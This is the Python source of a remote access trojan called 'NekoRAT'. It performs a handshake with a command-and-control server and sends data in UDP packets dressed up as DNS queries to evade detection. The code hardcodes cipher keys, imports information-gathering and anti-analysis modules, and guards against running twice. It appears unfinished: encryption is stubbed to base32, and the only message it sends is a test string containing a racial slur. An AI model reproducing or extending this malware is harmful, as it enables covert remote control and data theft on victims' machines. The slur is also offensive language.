'''⠀⠀⠀⠀⠀⠀⠀ ＿＿
　　　　　／＞　　フ
　　　　　|   _　 _ l
　 　　　／` ミ＿xノ
　　 　 /　　　 　 |
　　　 /　 ヽ　　 ﾉ
　 　 │　　|　|　|
　／￣|　　 |　|　|
　| (￣ヽ＿_ヽ_)__)
　＼二つ [NekoRAT, written by Nexus]
'''

import socket, sys, binascii, time
from cryptography.fernet import Fernet
from base64 import b32encode, b32decode
from submodules.information import *
from submodules.anti import *
from Crypto.Cipher import AES
from io import StringIO

cfg = {
    'c2_server': '127.0.0.1',
    'c2_port': 20001,
    'key': ''
}

class FKDL():
    def decode(text):
        val=int(hex(text[-1]),16)
        for i in range(len(text)-1,len(text)-val-1,-1):
            if text[i]!=val:return
        return text[:(len(text)-val)]
    
    def encode(text):
        output,val=StringIO(),48-(len(text)%48)
        for _ in range(val):output.write('%02x'%val)
        return text+binascii.unhexlify(output.getvalue())

    def encrypt(data):
        aes = AES.new(b"\x80I\xc3\xc9\xc2\xb3\'Y\xbb\x84\xb4\xb7\xa4r13\x11TY\x85)\xc1\xf7\xedG\xbck\x08\x06[7\x11", AES.MODE_OCB, b"\xad\x83\xeb\xbc\x08'\xa5\x15\x94\\\x0c3\x84\xa5`")
        aes.block_size = 512

        return b32encode(data.encode())
        #return b32encode(
        #    aes.encrypt(
        #        FKDL.encode(
        #            data
        #        )
        #    )
        #)[::-1].decode().replace('=','-')

    def decrypt(data):
        aes_decrypter = AES.new(b"\x80I\xc3\xc9\xc2\xb3\'Y\xbb\x84\xb4\xb7\xa4r13\x11TY\x85)\xc1\xf7\xedG\xbck\x08\x06[7\x11", AES.MODE_OCB, b"\xad\x83\xeb\xbc\x08'\xa5\x15\x94\\\x0c3\x84\xa5`")
        aes_decrypter.block_size = 512

        return b32decode(data.encode())
        #return FKDL.decode(
        #    aes_decrypter.decrypt(
        #        b32decode(
        #            str(data).replace('-','=')[::-1].encode()
        #        )
        #    )
        #).decode()

HEADER_UDP = b"\x7b\x71\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
TRAILER_UDP = b"\x08\x6d\x79\x64\x6f\x6d\x61\x69\x6e\x03\x74\x6c\x64\x00\x00\x01\x00\x01"

class vars():
    daddr = (cfg['c2_server'], cfg['c2_port'])
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind( ('0.0.0.0', 25) )

def socksend(message):
    vars.sock.sendto(b'SOF', vars.daddr)

    buffer = [message[i:i+30] for i in range(0,len(message), 30)]
    for msg in buffer:
        encrypted_message = FKDL.encrypt(msg)
        length_UDP = binascii.unhexlify(format(len(encrypted_message), '02x').replace('0x', '').encode())
        vars.sock.sendto(HEADER_UDP+length_UDP+encrypted_message+TRAILER_UDP, vars.daddr)

    vars.sock.sendto(b'EOF', vars.daddr)

def main():
    print('The cat says -> NekoRAT successfully launched.')

    vars.sock.sendto(b'CLIENT_HELO', vars.daddr )
    try:
        recv = vars.sock.recv(1024).decode()
        if recv != 'SERVER_HELO': sys.exit('The cat says -> Handshake failed, committing suicide!')
        else: print('The cat says -> Handshake success!')
    except: sys.exit('The cat says -> Handshake failed, committing suicide!')

    vars.sock.sendto(b'READY', vars.daddr)
    #n,g = FKDL.decrypt(vars.sock.recv(1024)).decode().split(':')   
    vars.sock.sendto(b'OK', vars.daddr)
    #b, ga = randint(10000, 100000), int(vars.sock.recv(1024).decode())
    #vars.sock.sendto(str((int(g) ** b) % int(n)).encode(), vars.daddr)

    socksend('was good my niggas how are yall')

if __name__ == '__main__':
    try: si_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); si_sock.bind( ('0.0.0.0', 13370) )
    except: print('The cat says -> Error while binding to single instance port, maybe duplicate process?'); exit()
    main()